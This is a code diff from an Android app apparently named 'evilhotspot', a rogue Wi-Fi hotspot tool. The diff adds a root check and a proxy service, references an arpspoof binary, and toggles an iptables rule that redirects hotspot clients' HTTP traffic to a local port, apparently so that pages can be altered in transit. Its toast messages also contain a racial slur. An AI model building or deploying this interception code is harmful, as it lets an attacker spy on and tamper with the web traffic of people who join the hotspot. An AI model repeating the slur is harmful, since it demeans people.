@@ -2,7 +2,9 @@ package android.evilhotspot;
 import android.content.Context;
 import android.content.Intent;
 import android.evilhotspot.proxy.HTMLEditor;
-import android.evilhotspot.proxy.HttpProxyService;
+import android.evilhotspot.proxy.proxyService;
+import android.graphics.Bitmap;
+import android.graphics.BitmapFactory;
 import android.net.wifi.WifiConfiguration;
 import android.net.wifi.WifiManager;
 import android.os.Bundle;
@@ -15,10 +17,13 @@ import android.view.Menu;
 import android.view.MenuItem;
 import android.widget.Button;
 import android.widget.Toast;
-
 import java.io.FileOutputStream;
+import java.io.IOException;
 import java.io.InputStream;
 import java.lang.reflect.Method;
+import java.net.HttpURLConnection;
+import java.net.MalformedURLException;
+import java.net.URL;
 
 //List of android permissions:
 //http://developer.android.com/reference/android/Manifest.permission.html
@@ -132,6 +137,8 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
         }
     }
 
+
+
     //change current state of mobile hotspot
     private void hsPressed(){
         //Part for switching img of main button & enable/disable checkbox default
@@ -144,7 +151,7 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
 
             if (!ApManager.isApOn()) {
                 hsButton.setBackgroundResource(R.drawable.button_on);
-                startService(new Intent(this, HttpProxyService.class));
+                startService(new Intent(this, proxyService.class));
 
                 if (wifiConfig.SSID.equals("AndroidAP")) {
                     ApManager.isCheckBoxChecked = true;
@@ -157,7 +164,7 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
             //WIFI IS ON Make OFF
             else if (ApManager.isApOn()) {
                 hsButton.setBackgroundResource(R.drawable.button_off);
-                stopService(new Intent(this, HttpProxyService.class));
+                stopService(new Intent(this, proxyService.class));
                 if (wifiConfig.SSID.equals("AndroidAP"))  {
                     ApManager.isCheckBoxChecked = true;
                 }
@@ -182,8 +189,10 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
             toastMessage("We got root niggah!");
         }
         else{
-            if (exe.RunAsRootOutput("busybox id -u").equals("0"))
+            if (exe.RunAsRootOutput("busybox id -u").equals("0")) {
                 toastMessage("We got root niggah!");
+            }
+
             else
                 toastMessage("We don't have root my mans...");
         }
@@ -194,7 +203,7 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
             //os.writeBytes("chmod 700 /data/data/android.evilhotspot/files/arpspoof\n");
     }
     //for saving embedded raw binary blob as file that can be run on filesystem
-    public int saveFile(String filename, InputStream raw ){
+    public int saveFile(String filename, InputStream raw){
         try {
             FileOutputStream fos = openFileOutput(filename, Context.MODE_PRIVATE);
             int readbyte = 0;
@@ -214,22 +223,25 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
     //inject/remove iptables rule that will route http traffic to our app
     private int iptablesRulePressed(Button ruleButton){
         ShellExecutor exe = new ShellExecutor();
-       // if (ruleButton.getText().toString().equals("Inject rule")) {
+        //check if rule exists, if yea, remove it, if no insert it
+        if ( ! exe.doesRuleExists()) {
             if (exe.RunAsRoot("iptables -t nat -I PREROUTING -i wlan0 -p tcp --dport 80 -j REDIRECT --to-port 1337")) {
+                //TODO TUTAJ ZMIENIAMY PRZYCISK NA REMOVE RULE
                 ruleButton.setText("Remove rule");
                 toastMessage("Success");
             }
             else
                 toastMessage("Failed");
-//        }
-//        else {
-//            if (exe.RunAsRoot("iptables -t nat -D PREROUTING -i wlan0 -p tcp --dport 80 -j REDIRECT --to-port 1337")){
-//                ruleButton.setText("Inject rule");
-//                toastMessage("Success");
-//            }
-//            else
-//                toastMessage("Failed");
-//        }
+        }
+        else {
+            if (exe.RunAsRoot("iptables -t nat -D PREROUTING -i wlan0 -p tcp --dport 80 -j REDIRECT --to-port 1337")){
+                //TODO TUTAJ ZMIENIAMY PRZYCISK NA INJECT RULE
+                ruleButton.setText("Inject rule");
+                toastMessage("Success");
+            }
+            else
+                toastMessage("Failed");
+        }
         return 0;
     }
     //function for debugging etc. (shows toast with msg text)
